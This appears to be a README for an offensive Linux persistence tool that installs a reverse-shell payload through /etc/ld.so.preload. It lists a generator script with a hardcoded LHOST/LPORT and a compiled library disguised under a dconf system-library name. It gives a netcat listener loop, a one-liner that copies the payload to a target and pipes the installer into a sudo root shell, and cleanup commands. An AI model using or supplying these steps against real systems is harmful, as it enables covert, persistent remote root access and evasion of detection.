# LD_PRELOAD:
Implements rate limited reverse shell via dynamic linker

## Files:
- ld_gen.sh: Ran on host machine to compile the so. with hardcoded LHOST/LPORT
- ld_install.sh: Ran on the target to handle pathing, permissions, and integrity checks
- libdconf-update.so: Compiled payload

## Listener:
- while true; do nc -lvnp 4444; done

## Deploy From ld_preload Directory (One liner)
- Uploads the binary and pipes the installer script directly into a remote root shell
    - bash ld_gen.sh && scp libdconf-update.so <target_user>@<target_ip>:/tmp/ && ssh -t <target_user>@<target_ip> "sudo bash -s" < ld_install.sh

## Cleanup (From host)
- ssh -t <target_user>@<target_ip> "sudo sed -i '\|/usr/lib/x86_64-linux-gnu/libdconf-1.so.0.99|d' /etc/ld.so.preload && sudo rm -f /usr/lib/x86_64-linux-gnu/libdconf-1.so.0.99 /var/tmp/.dconf-lock"